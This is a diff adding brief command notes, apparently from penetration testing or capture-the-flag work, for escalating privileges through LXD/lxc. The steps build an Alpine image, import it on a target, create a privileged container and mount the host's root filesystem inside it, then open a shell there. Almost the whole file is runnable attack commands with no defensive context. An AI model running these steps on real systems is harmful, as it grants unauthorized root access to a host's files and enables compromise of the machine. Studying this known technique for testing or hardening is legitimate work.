@@ -1,0 +1,24 @@
+build images: 
+sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml --type=split -o image.release=3.18
+
+(upload both files to taregt)
+lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+
+Check the image is there:
+lxc image list
+
+Create the container:
+lxc init alpine privesc -c security.privileged=true
+
+List containers:
+lxc list
+
+Set up privesc:
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+
+Execute privesc:
+lxc start privesc
+lxc exec privesc /bin/sh
+
+Here is where the filesystem is mounted:
+cd /mnt/root 
